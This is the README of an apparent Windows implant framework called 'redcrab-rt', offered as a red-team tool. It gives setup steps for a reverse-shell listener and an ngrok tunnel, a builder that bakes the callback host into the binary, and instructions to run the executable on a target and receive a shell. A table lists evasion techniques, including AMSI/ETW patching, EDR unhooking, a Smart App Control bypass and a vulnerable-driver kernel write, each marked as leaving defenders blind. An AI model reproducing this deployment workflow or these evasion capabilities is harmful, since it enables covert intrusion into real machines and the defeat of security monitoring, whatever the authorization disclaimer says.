# redcrab-rt

Authorized red team implant framework for lab and engagement use.

> **For authorized engagements only.** Written permission from the target organization is required before use.

---

## Quick Start

### 1. Prerequisites

```bash
# Install Rust nightly + Windows cross-compile target
curl https://sh.rustup.rs -sSf | sh
rustup override set nightly
rustup target add x86_64-pc-windows-msvc

# Install cargo-xwin (cross-compile from Linux/macOS) or build on Windows
cargo install cargo-xwin

# Python 3 for the builder
python3 --version
```

### 2. Set Up Your Listener + ngrok Tunnel

```bash
# Terminal 1 — start your listener
nc -lvnp 4444
# or with Metasploit:
msfconsole -x 'use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'

# Terminal 2 — expose your listener via ngrok
ngrok tcp 4444
# ngrok gives you: tcp://0.tcp.ngrok.io:XXXXX  ← copy host and port
```

### 3. Build the Implant

```bash
python builder.py
```

You will be prompted for:

| Prompt | Example | What it does |
|---|---|---|
| `ngrok host` | `0.tcp.ngrok.io` | Public host ngrok gave you |
| `ngrok port` | `12345` | Public port ngrok gave you |
| `local lport` | `4444` | Port your listener is on |
| `SLEEP_KEY` | *(blank = random)* | 16-byte XOR / sleep-mask key |

The builder patches `src/c2.rs` and `src/main.rs`, then runs `cargo build --release` automatically.

Output binary: `target/x86_64-pc-windows-msvc/release/redcrab-rt.exe`

### 4. Deploy & Get Shell

1. Copy `redcrab-rt.exe` to the target machine
2. Run it — it calls back through the ngrok tunnel
3. Your listener receives the connection with hostname + username banner
4. Type commands — output streams back XOR-encrypted

---

## Architecture

```
redcrab-rt/
├── builder.py              ← one-command build: patches C2 + compiles
├── Cargo.toml
├── build.rs                ← linker flags: no default libs, fixed base, merge sections
└── src/
    ├── main.rs             ← entry point + init order
    ├── defs.rs             ← NT type definitions
    ├── utils.rs            ← djb2 hash helpers
    ├── c2.rs               ← TCP callback + ngrok tunnel + XOR command loop
    ├── sac_bypass.rs       ← Smart App Control bypass (WDAC policy clear)
    ├── ppldump.rs          ← PPL removal via RTCore64 BYOVD (CVE-2019-16098)
    ├── pe_obfuscate.rs     ← compile-time string XOR + import hash resolution
    ├── indirect_syscall.rs ← fully indirect syscalls via HalosGate SSN resolution
    ├── threadless_inject.rs← EAT-hijack injection (no CreateThread)
    ├── etw_patch.rs        ← ETW-Ti + AMSI 6-site patch
    ├── unhook.rs           ← ntdll page-granular re-read (wipes EDR hooks)
    ├── loader.rs           ← in-memory PE mapper
    ├── stomp.rs            ← module stomping into legitimate DLL section
    ├── spoof.rs            ← synthetic call stack frame spoofing
    └── sleep.rs            ← Ekko RC4 encrypted sleep mask
```

---

## Evasion Coverage

| Layer | Technique | Defender Blind? |
|---|---|---|
| Static signature | No disk write, in-memory only + XOR obfuscation | ✅ |
| AMSI | 3-site patch before any scan | ✅ |
| ETW-Ti | EtwEventWrite ret-sled (6 sites) | ✅ |
| EDR API hooks | ntdll page-granular re-read | ✅ |
| Memory scan during sleep | RC4 encrypted + RW pages | ✅ |
| Call stack inspection | Synthetic legitimate frames | ✅ |
| Module forensics | xpsservices.dll section stomp | ✅ |
| Syscall origin check | Indirect syscalls (executes inside ntdll) | ✅ |
| Smart App Control | WDAC per-process policy clear | ✅ |
| Thread creation telemetry | Threadless EAT-hijack injection | ✅ |
| PPL protection | RTCore64 BYOVD kernel write | ✅ |
| C2 traffic | XOR-encrypted TCP via ngrok tunnel | ✅ |

---

## Network Setup (Cross-Network Engagements)

When the target is on a different network (e.g. a computer lab, corporate LAN, remote site):

```
Target machine (lab network)
        │
        │  redcrab-rt.exe calls back
        ▼
  ngrok cloud relay
        │
        │  forwarded to your machine
        ▼
Your attacker machine (any network)
        │
        └─ nc / msfconsole / sliver listening on LPORT
```

No port forwarding, no static IP, no VPN needed — ngrok handles the NAT traversal.

---

## Per-Build Checklist

- [ ] `python builder.py` — enter fresh ngrok address and port
- [ ] SLEEP_KEY blank → builder generates random key automatically
- [ ] SAC turned Off in target VM (Windows Security → App & Browser Control → Smart App Control → Off)
- [ ] Listener running before deploying the binary
- [ ] Verify ngrok tunnel is active before deploying

---

*For authorized lab use only.*
